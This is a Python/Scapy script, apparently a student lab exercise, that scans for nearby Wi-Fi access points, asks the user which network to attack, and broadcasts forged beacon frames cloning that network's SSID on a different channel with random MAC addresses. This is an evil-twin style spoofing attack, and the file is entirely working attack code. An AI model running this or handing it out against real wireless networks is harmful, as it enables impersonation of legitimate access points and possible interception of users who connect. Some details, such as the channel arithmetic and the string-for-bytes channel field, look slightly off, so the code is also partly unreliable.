#!/usr/bin/env python

from scapy.all import *

# Fonction appelée sur chaque paquet sniffé
# Stock chaque réseau avec SSID unique dans un dictionnaire
def pkt_handler(pkt):
    network = []
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            #if pkt.type== 0 and pkt.subtype == 8:
            if pkt.info not in ap_list and len(pkt.info) > 0:
                ssid = pkt[Dot11Elt].info
                bssid = pkt[Dot11].addr3
                channel = int(ord(pkt[Dot11Elt:3].info))
                power = pkt.dBm_AntSignal
                network = [bssid, channel, power]
                ap_list[ssid] = network
        except AttributeError:
            pass

# Génère un beacon concurrent
def generate_concurrent_beacon(target_ssid, target_infos):
    # Calcul du canal pour le beacon concurrent (6 canaux de séparation du canal du réseau cible)
    concurrent_channel = (target_infos[1] + 6) % 15

    # Création de la trame Beacon concurrente avec le même SSID que la cible, sur un canal différent
    packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID='SSID', info=target_ssid.encode())/Dot11Elt(ID='DSset', info=chr(concurrent_channel))

    # Envoi de la trame Beacon concurrente
    sendp(packet, iface='wlan0mon', inter=0.1, verbose=1)


# List des AP
ap_list = {}

def main():

    # Snif les paquets pour détecter les AP
    print("Sniffing en cours...")
    sniff(count = 100, timeout=5, iface="wlan0mon", prn = pkt_handler)

    # Affiche les AP détéctés
    print("SSID :: BSSID :: Canal :: Puissance")
    for ap in ap_list:
        print(ap.decode(), ap_list[ap])

    target_ssid = input("Réseau à attaquer: ")

    print(ap_list[target_ssid.encode()])

    generate_concurrent_beacon(target_ssid, ap_list[target_ssid.encode()])

if __name__ == "__main__":
    main()
